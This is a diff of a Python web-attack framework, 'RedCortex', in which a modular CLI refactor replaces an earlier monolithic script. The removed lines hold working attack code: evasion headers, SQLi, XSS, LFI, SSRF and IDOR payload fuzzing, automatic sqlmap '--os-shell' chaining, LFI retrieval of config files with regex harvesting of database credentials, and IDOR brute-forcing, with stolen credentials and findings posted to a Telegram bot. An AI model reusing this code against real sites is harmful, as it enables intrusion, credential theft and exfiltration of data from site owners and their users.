@@ -1,325 +1,307 @@
 #!/usr/bin/env python3
+"""RedCortex - Modular Red Team Web Pentest Framework.
+
+Refactored version with improved modularity, logging, and CLI interface.
 """
-RedCortex - Ultimate Red Team Web Pentest Framework
-Dirsearch, Playwright, Plugins (SQLi, XSS, LFI, SSRF, IDOR), Exploit Chaining, Session, Telegram, Dashboard
-"""
+import argparse
+import logging
+import sys
+import os
+from pathlib import Path
 
-import requests, random, time, argparse, sys, json, threading, csv, pickle, subprocess, glob, os, re
-from bs4 import BeautifulSoup
-from flask import Flask, jsonify, request
-from playwright.sync_api import sync_playwright
+# Import core modules
+from config import Config
+from discovery import EndpointScanner
+from plugins import PluginManager
+from result import ResultManager
+from dashboard import Dashboard
 
-TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
-TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:52.0)",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2)",
-    "Mozilla/5.0 (Android 10; SM-G973F)"
-]
-TAMPERS = ["space2comment", "between", "randomcase", "charencode"]
 
-def evasion_headers():
-    ua = random.choice(USER_AGENTS)
-    return {"User-Agent": ua, "X-Forwarded-For": ".".join(str(random.randint(0,255)) for _ in range(4))}
-def evasion_delay(min_delay=0.4, max_delay=1.7): time.sleep(random.uniform(min_delay, max_delay))
-def send_telegram(msg):
-    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"}
-    try: requests.post(url, data=payload, timeout=7)
-    except: pass
-def save_session(filename, obj): pickle.dump(obj, open(filename,"wb"))
-def load_session(filename): return pickle.load(open(filename,"rb")) if os.path.exists(filename) else {}
+def setup_logging(verbose: bool = False, log_file: str = None):
+    """Configure structured logging.
+    
+    Args:
+        verbose: Enable verbose/debug logging
+        log_file: Path to log file (optional)
+    """
+    log_level = logging.DEBUG if verbose else logging.INFO
+    log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+    
+    # Console handler
+    console_handler = logging.StreamHandler(sys.stdout)
+    console_handler.setLevel(log_level)
+    console_handler.setFormatter(logging.Formatter(log_format))
+    
+    handlers = [console_handler]
+    
+    # File handler if specified
+    if log_file:
+        file_handler = logging.FileHandler(log_file)
+        file_handler.setLevel(logging.DEBUG)
+        file_handler.setFormatter(logging.Formatter(log_format))
+        handlers.append(file_handler)
+    
+    logging.basicConfig(level=log_level, handlers=handlers)
+    
+    # Suppress noisy loggers
+    logging.getLogger('urllib3').setLevel(logging.WARNING)
+    logging.getLogger('requests').setLevel(logging.WARNING)
 
-def run_dirsearch(target_url, wordlist="SecLists/Discovery/Web-Content/common.txt"):
-    cmd = ["python3", "dirsearch/dirsearch.py", "-u", target_url,
-            "-e", "php,asp,aspx,html", "-w", wordlist, "--plain-text-report=found_endpoints.txt"]
-    subprocess.run(cmd)
-    endpoints = set()
-    try:
-        with open("found_endpoints.txt") as f:
-            for line in f:
-                endpoint = line.strip().split()[0]
-                if "http" in endpoint and "200" in line:
-                    endpoints.add(endpoint)
-    except Exception: pass
-    return list(endpoints)
 
-def browser_crawl(url):
-    endpoints, params = set(), set()
-    try:
-        with sync_playwright() as p:
-            browser = p.chromium.launch(headless=True)
-            page = browser.new_page()
-            page.goto(url, timeout=60000)
-            endpoints.update([a.get_attribute("href") for a in page.query_selector_all("a[href]") if a.get_attribute("href")])
-            for form in page.query_selector_all("form"):
-                for inp in form.query_selector_all("input[name]"):
-                    params.add(inp.get_attribute("name"))
-            browser.close()
-    except Exception as e:
-        print(f"Playwright error: {e}")
-    return list(filter(None,endpoints)), list(filter(None,params))
-
-def html_param_parse(url):
-    params = set()
-    try:
-        html = requests.get(url, timeout=8).text
-        soup = BeautifulSoup(html, 'html.parser')
-        for form in soup.find_all("form"):
-            for input in form.find_all("input"):
-                name = input.get("name")
-                if name: params.add(name)
-        for a in soup.find_all("a", href=True):
-            href = a['href']
-            if '?' in href:
-                args = href.split('?',1)[1].split('&')
-                for arg in args:
-                    if '=' in arg: params.add(arg.split('=')[0])
-    except Exception as e:
-        pass
-    return list(params)
-
-def brute_param_list(dictionary="SecLists/Fuzzing/parameter-names.txt"):
-    params = set()
-    try:
-        with open(dictionary) as f:
-            params.update(line.strip() for line in f if line.strip())
-    except Exception: pass
-    return list(params)
-
-class VulnPlugin:
-    def run(self, url, params, session, original_sqlcode=None): return []
-class SQLiPlugin(VulnPlugin):
-    def run(self, url, params, session, original_sqlcode=None):
-        TAMPERS = ["", "space2comment", "between", "randomcase", "charencode"]
-        BOOLEAN_PAYLOADS = [("1 AND 1=1", "1 AND 1=2"), ("1' AND 1=1-- -", "1' AND 1=2-- -"), ('1") AND 1=1-- -', '1") AND 1=2-- -'), ("1 OR 1=1", "1 OR 1=2")]
-        ERROR_PAYLOADS = ["'", '"', "1'", '1")', "1'--", '1")--']
-        UNION_PAYLOADS = ["1 UNION SELECT NULL-- -", "1' UNION SELECT 1,2,3-- -"]
-        ERROR_SIGNATURES = ["SQL syntax", "mysql_fetch", "ODBC", "Warning", "error in your SQL", "Query failed", "near", "unterminated", "Unknown column",
-            "ORA-", "PG::", "psql:", "sqlite", "syntax error", "invalid input"]
-        hits = []
-        for param_name in params:
-            for tamper in TAMPERS:
-                for true_pay, false_pay in BOOLEAN_PAYLOADS:
-                    p_true, p_false = dict(params), dict(params)
-                    p_true[param_name] = true_pay
-                    p_false[param_name] = false_pay
-                    try:
-                        sc_true, b_true = self._req(url, p_true)
-                        sc_false, b_false = self._req(url, p_false)
-                        if sc_true == sc_false == 200 and abs(len(b_true) - len(b_false)) > 8:
-                            hits.append(["SQLi-Boolean", url, param_name, true_pay, tamper])
-                            return hits
-                    except: continue
-                for pay in ERROR_PAYLOADS:
-                    p_e = dict(params)
-                    p_e[param_name] = pay
-                    try:
-                        sc, b = self._req(url, p_e)
-                        if any(sig in b for sig in ERROR_SIGNATURES):
-                            hits.append(["SQLi-Error", url, param_name, pay, tamper])
-                            return hits
-                    except: continue
-                for up in UNION_PAYLOADS:
-                    p_u = dict(params)
-                    p_u[param_name] = up
-                    try:
-                        sc, b = self._req(url, p_u)
-                        for marker in ["NULL", "1", "2", "3"]:
-                            if marker in b:
-                                hits.append(["SQLi-Union", url, param_name, up, tamper])
-                                return hits
-                    except: continue
-        return hits
-
-    def _req(self, url, params):
-        resp = requests.get(url, params=params, headers=evasion_headers(), timeout=12)
-        return resp.status_code, resp.text
-
-class XSSPlugin(VulnPlugin):
-    def run(self, url, params, session, original_sqlcode=None):
-        test_params = dict(params); k = next(iter(params)) if params else "q"
-        test_params[k] = "<svg onload=alert(69)>"
+def cmd_scan(args):
+    """Execute scan subcommand.
+    
+    Args:
+        args: Parsed command-line arguments
+    """
+    logger = logging.getLogger(__name__)
+    
+    # Load configuration
+    config = Config(args.config if args.config else None)
+    if args.timeout:
+        config.timeout = args.timeout
+    if args.workers:
+        config.max_workers = args.workers
+    
+    # Initialize components
+    plugin_manager = PluginManager(args.plugins_dir)
+    logger.info(f"Loaded {plugin_manager.get_plugin_count()} plugins")
+    
+    result_manager = ResultManager(config.output_dir)
+    scanner = EndpointScanner(config, plugin_manager)
+    
+    # Validate target URL
+    if not scanner.validate_url(args.target):
+        logger.error(f"Invalid target URL: {args.target}")
+        sys.exit(1)
+    
+    # Load custom paths if provided
+    paths = None
+    if args.paths:
         try:
-            r = requests.get(url, params=test_params, headers=evasion_headers(), timeout=7)
-            if "<svg onload=alert(69)>" in r.text: return ["XSS", url, dict(test_params)]
-        except: pass
-        return []
-class LFIPlugin(VulnPlugin):
-    def run(self, url, params, session, original_sqlcode=None):
-        for k in params:
-            test_params = dict(params)
-            test_params[k] = "../../etc/passwd"
-            try:
-                r = requests.get(url, params=test_params, headers=evasion_headers(), timeout=8)
-                if "root:" in r.text and "/bin/bash" in r.text: return ["LFI", url, dict(test_params)]
-            except: pass
-        return []
-class SSRFPlugin(VulnPlugin):
-    def run(self, url, params, session, original_sqlcode=None):
-        for k in params:
-            test_params = dict(params)
-            test_params[k] = "http://127.0.0.1/"
-            try:
-                r = requests.get(url, params=test_params, headers=evasion_headers(), timeout=8)
-                if ("localhost" in r.text or "127.0." in r.text): return ["SSRF", url, dict(test_params)]
-            except: pass
-        return []
-class IDORPlugin(VulnPlugin):
-    def run(self, url, params, session, original_sqlcode=None):
-        for k in params:
-            tryid = "2" if params[k]=="1" else "1"
-            test_params = dict(params); test_params[k] = tryid
-            try: r = requests.get(url, params=test_params, headers=evasion_headers(), timeout=7)
-            except: continue
-            if r.status_code==200 and len(r.content) > 50: return ["IDOR", url, dict(test_params)]
-        return []
-
-vuln_plugins = [SQLiPlugin(), XSSPlugin(), LFIPlugin(), SSRFPlugin(), IDORPlugin()]
-def plugin_scan(endpoint, paramset, session, original_sqlcode=None):
-    results = []
-    for plugin in vuln_plugins:
-        result = plugin.run(endpoint, paramset, session, original_sqlcode)
-        if result: results.append(result)
-    return results
-
-def exploit_chain(hit, session):
-    # SQLi chain 
-    if hit[0].startswith("SQLi") and "OS-Shell" not in hit:
-        print(f"[Automated Chain] Trying OS shell via sqlmap on {hit[1]} param {hit[2]}")
-        try:
-            target_url = hit[1]
-            param = hit[2]
-            cmd = [
-                "python3", "sqlmap.py", "-u", target_url + "?" + f"{param}=' OR 1=1--",
-                "--batch", "--os-shell", "--threads=4", "--random-agent",
-                "--risk=3", "--level=5", "--tamper=space2comment,between,randomcase,charencode",
-                "-p", param
-            ]
-            print(f"[Chain] Running: {' '.join(cmd)}")
-            subprocess.run(cmd)
+            with open(args.paths, 'r') as f:
+                paths = [line.strip() for line in f if line.strip()]
+            logger.info(f"Loaded {len(paths)} custom paths from {args.paths}")
         except Exception as e:
-            print(f"Chain error: {e}")
+            logger.error(f"Failed to load paths file: {e}")
+            sys.exit(1)
+    
+    # Perform scan
+    print(f"\n🔴 Starting RedCortex scan of {args.target}")
+    print("="*60)
+    
+    try:
+        results = scanner.scan_target(args.target, paths)
+        
+        # Save results
+        scan_id = args.scan_id if args.scan_id else None
+        output_file = result_manager.save_results(results, args.target, scan_id)
+        
+        # Generate and display report
+        report = result_manager.generate_report(results, format='text')
+        print("\n" + report)
+        
+        print(f"\n✓ Scan complete. Results saved to: {output_file}")
+        
+        if args.output:
+            with open(args.output, 'w') as f:
+                f.write(report)
+            print(f"✓ Report saved to: {args.output}")
+        
+    except KeyboardInterrupt:
+        logger.warning("Scan interrupted by user")
+        print("\nScan interrupted.")
+        sys.exit(1)
+    except Exception as e:
+        logger.error(f"Scan failed: {e}", exc_info=True)
+        print(f"\n✗ Scan failed: {e}")
+        sys.exit(1)
+
+
+def cmd_resume(args):
+    """Resume a previous scan.
+    
+    Args:
+        args: Parsed command-line arguments
+    """
+    logger = logging.getLogger(__name__)
+    logger.info(f"Attempting to resume scan: {args.scan_id}")
+    
+    result_manager = ResultManager()
+    scan_data = result_manager.load_results(args.scan_id)
+    
+    if not scan_data:
+        logger.error(f"Scan {args.scan_id} not found")
+        print(f"✗ Scan {args.scan_id} not found")
+        sys.exit(1)
+    
+    print(f"\nResuming scan {args.scan_id}")
+    print(f"Target: {scan_data['target']}")
+    print(f"Original scan time: {scan_data['timestamp']}")
+    print("\nNote: Full resume functionality requires state management.")
+    print("This shows the previous results. Use 'report' command to regenerate report.")
+
+
+def cmd_report(args):
+    """Generate report from scan results.
+    
+    Args:
+        args: Parsed command-line arguments
+    """
+    logger = logging.getLogger(__name__)
+    result_manager = ResultManager()
+    
+    scan_data = result_manager.load_results(args.scan_id)
+    
+    if not scan_data:
+        logger.error(f"Scan {args.scan_id} not found")
+        print(f"✗ Scan {args.scan_id} not found")
+        sys.exit(1)
+    
+    # Generate report
+    results = scan_data.get('results', [])
+    report_format = args.format if args.format else 'text'
+    report = result_manager.generate_report(results, format=report_format)
+    
+    if args.output:
+        with open(args.output, 'w') as f:
+            f.write(report)
+        print(f"✓ Report saved to: {args.output}")
+    else:
+        print(report)
+
+
+def cmd_dashboard(args):
+    """Start web dashboard.
+    
+    Args:
+        args: Parsed command-line arguments
+    """
+    logger = logging.getLogger(__name__)
+    config = Config()
+    result_manager = ResultManager(config.output_dir)
+    
+    port = args.port if args.port else config.dashboard_port
+    dashboard = Dashboard(result_manager, port=port)
+    
+    try:
+        dashboard.start()
+    except Exception as e:
+        logger.error(f"Dashboard failed: {e}")
+        print(f"✗ Dashboard failed: {e}")
+        sys.exit(1)
+
+
+def cmd_list(args):
+    """List available scans.
+    
+    Args:
+        args: Parsed command-line arguments
+    """
+    result_manager = ResultManager()
+    scans = result_manager.list_scans()
+    
+    if not scans:
+        print("No scans found.")
         return
+    
+    print("\nAvailable scans:")
+    print("="*80)
+    for scan in scans:
+        findings_str = f"{scan['findings_count']} findings" if scan['findings_count'] > 0 else "No findings"
+        print(f"{scan['scan_id']:<20} {scan['target']:<40} {findings_str}")
+        print(f"  Timestamp: {scan['timestamp']}")
+        print()
 
-    # LFI chain: auto-fetch config file and parse for credentials
-    if hit[0] == "LFI":
-        for k,v in hit[2].items():
-            # Attempt to fetch common config files for credential parsing
-            for config_name in ["config.php", "wp-config.php", "database.php", ".env"]:
-                test_params = dict(hit[2])
-                test_params[k] = f"../../{config_name}"
-                try:
-                    resp = requests.get(hit[1], params=test_params, headers=evasion_headers(), timeout=10)
-                    if resp.status_code == 200 and len(resp.text) > 24:
-                        creds = []
-                        for line in resp.text.splitlines():
-                            # Parse typical creds
-                            for regex in [r"['\"](?:user|username|db_user)['\"]?\s*[,:=]\s*['\"](.+?)['\"]",
-                                          r"['\"](?:pass|password|db_pass)['\"]?\s*[,:=]\s*['\"](.+?)['\"]",
-                                          r"DB_USER\s*=\s*['\"]?(.+?)['\"]?",
-                                          r"DB_PASS\s*=\s*['\"]?(.+?)['\"]?"]:
-                                m = re.search(regex, line, re.I)
-                                if m: creds.append((config_name, m.group(1)))
-                        if creds:
-                            session.setdefault("auto_creds", []).extend(creds)
-                            print(f"[Chain][LFI] Found credentials in {config_name}: {creds}")
-                            send_telegram(f"[Chain][LFI] Found credentials in {config_name}: {creds}")
-                except Exception as e:
-                    print(f"[Chain][LFI/config] error: {e}")
-        return
 
-    # IDOR chain: brute/pivot more IDs and login targets
-    if hit[0] == "IDOR":
-        base_url = hit[1]
-        param_name = next(iter(hit[2]))
-        print(f"[Automated Chain][IDOR] Brute-forcing additional IDs for param {param_name} on {base_url}")
-        for test_id in range(1,21): # Try IDs 1-20
-            params = dict(hit[2])
-            params[param_name] = str(test_id)
-            try:
-                resp = requests.get(base_url, params=params, headers=evasion_headers(), timeout=7)
-                if resp.status_code==200 and len(resp.content) > 70:
-                    found_strings = [w for w in ["admin", "password", "token", "secret"] if w in resp.text.lower()]
-                    if found_strings:
-                        print(f"[Chain][IDOR] ID {test_id} found interesting data ({found_strings}): {base_url}?{param_name}={test_id}")
-                        send_telegram(f"[Chain][IDOR] Found: {base_url}?{param_name}={test_id} ({found_strings})")
-            except Exception as e:
-                continue
-# --- FLASK DASHBOARD & RESULTS ---
-app = Flask(__name__)
-attack_results = []
+def create_parser():
+    """Create and configure argument parser.
+    
+    Returns:
+        Configured ArgumentParser instance
+    """
+    parser = argparse.ArgumentParser(
+        prog='RedCortex',
+        description='Modular Red Team Web Penetration Testing Framework',
+        epilog='For detailed help on subcommands, use: %(prog)s <subcommand> --help'
+    )
+    
+    parser.add_argument('-v', '--verbose', action='store_true',
+                       help='Enable verbose/debug logging')
+    parser.add_argument('--log-file', metavar='FILE',
+                       help='Write logs to FILE')
+    parser.add_argument('--config', metavar='FILE',
+                       help='Configuration file path')
+    
+    subparsers = parser.add_subparsers(dest='command', help='Available commands')
+    
+    # Scan subcommand
+    scan_parser = subparsers.add_parser('scan', help='Scan a target URL')
+    scan_parser.add_argument('target', help='Target URL to scan')
+    scan_parser.add_argument('-p', '--paths', metavar='FILE',
+                           help='File containing paths to scan (one per line)')
+    scan_parser.add_argument('-t', '--timeout', type=int, metavar='SECONDS',
+                           help='Request timeout in seconds')
+    scan_parser.add_argument('-w', '--workers', type=int, metavar='N',
+                           help='Number of concurrent workers')
+    scan_parser.add_argument('-o', '--output', metavar='FILE',
+                           help='Save report to FILE')
+    scan_parser.add_argument('--scan-id', metavar='ID',
+                           help='Custom scan ID (auto-generated if not provided)')
+    scan_parser.add_argument('--plugins-dir', default='plugins',
+                           help='Directory containing plugins (default: plugins)')
+    
+    # Resume subcommand
+    resume_parser = subparsers.add_parser('resume', help='Resume a previous scan')
+    resume_parser.add_argument('scan_id', help='Scan ID to resume')
+    
+    # Report subcommand
+    report_parser = subparsers.add_parser('report', help='Generate report from scan results')
+    report_parser.add_argument('scan_id', help='Scan ID to generate report for')
+    report_parser.add_argument('-f', '--format', choices=['text', 'markdown'],
+                             default='text', help='Report format (default: text)')
+    report_parser.add_argument('-o', '--output', metavar='FILE',
+                             help='Save report to FILE (prints to stdout if not specified)')
+    
+    # Dashboard subcommand
+    dashboard_parser = subparsers.add_parser('dashboard', help='Start web dashboard')
+    dashboard_parser.add_argument('-p', '--port', type=int, metavar='PORT',
+                                help='Dashboard port (default: 8080)')
+    
+    # List subcommand
+    list_parser = subparsers.add_parser('list', help='List all available scans')
+    
+    return parser
 
-@app.route('/report', methods=['GET'])
-def get_report():
-    return jsonify({"results": attack_results})
 
-def run_dashboard():
-    threading.Thread(target=app.run, kwargs={"port": 8088, "debug": False}).start()
-
-# --- Attack path graph mapping (simple stdout, optional for further matplotlib/networkx visualization) ---
-def print_attack_chain(chain):
-    print("\n[Attack Path Chain Topology]:")
-    for step in chain:
-        if step["results"]:
-            for res in step["results"]:
-                print(f"{step['endpoint']} --[{res[0]}]--> {res[2] if len(res) > 2 else ''}")
-
-# --- INTERACTIVE SHELL (simplified) ---
-def interactive_shell(results):
-    print("\n=== Interactive Exploit Shell ===")
-    print("Type 'exit' to leave. Provide endpoint/param and POC payload to exploit.")
-    while True:
-        cmd = input("cmd> ").strip()
-        if cmd in ("exit","quit"): break
-        print(f"Simulated shell command: {cmd} -- (implement dynamic SQL/HTTP as needed)")
-
-# --- MAIN WORKFLOW ---
 def main():
-    parser = argparse.ArgumentParser("GOLDMINE Advanced - Web Red Team Framework (dashboard, reporting, chaining)")
-    parser.add_argument("--url", help="Target site root", required=True)
-    parser.add_argument("--session", default="ultimate_recon.pkl", help="Session filename")
+    """Main entry point for RedCortex."""
+    parser = create_parser()
     args = parser.parse_args()
+    
+    # Setup logging
+    setup_logging(verbose=args.verbose, log_file=args.log_file if hasattr(args, 'log_file') else None)
+    
+    # Show help if no command specified
+    if not args.command:
+        parser.print_help()
+        sys.exit(1)
+    
+    # Execute command
+    commands = {
+        'scan': cmd_scan,
+        'resume': cmd_resume,
+        'report': cmd_report,
+        'dashboard': cmd_dashboard,
+        'list': cmd_list
+    }
+    
+    if args.command in commands:
+        commands[args.command](args)
+    else:
+        parser.print_help()
+        sys.exit(1)
 
-    try:
-        state = load_session(args.session) if args.session else {"results":[], "chain":[]}
-    except Exception: state = {"results":[], "chain":[]}
 
-    run_dashboard()
-    print("[*] Dashboard running on http://localhost:8088/report")
-
-    print("[*] Dirsearch endpoint brute ...")
-    endpoints = run_dirsearch(args.url)
-    browser_eps, browser_params = browser_crawl(args.url)
-    all_eps = set(endpoints + browser_eps + [args.url])
-    all_params = set(browser_params + brute_param_list())
-    print(f"[+] Endpoints total: {len(all_eps)}, Params found: {len(all_params)}")
-
-    # Main scan loop
-    for ep in all_eps:
-        evasion_delay()
-        try:
-            print(f"\n[*] Scanning {ep} ...")
-            params = {p: "1" for p in all_params if p}  # Fuzz all params
-            params.update({p:"1" for p in html_param_parse(ep)})
-            results = plugin_scan(ep, params, state)
-            for hit in results:
-                print("[*] HIT:", hit)
-                attack_results.append(hit)
-                send_telegram(str(hit))
-                exploit_chain(hit, state)
-            state["results"] += results
-            state["chain"].append({"endpoint": ep, "params": params, "results": results})
-            save_session(args.session, state)
-        except Exception as e:
-            print(f"[Error: {e}] Continuing...")
-
-    print_attack_chain(state["chain"])
-    send_telegram("\n".join([f"{s['endpoint']}: {s['results']}" for s in state["chain"]]))
-
-    interactive_shell(state["results"])
-
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
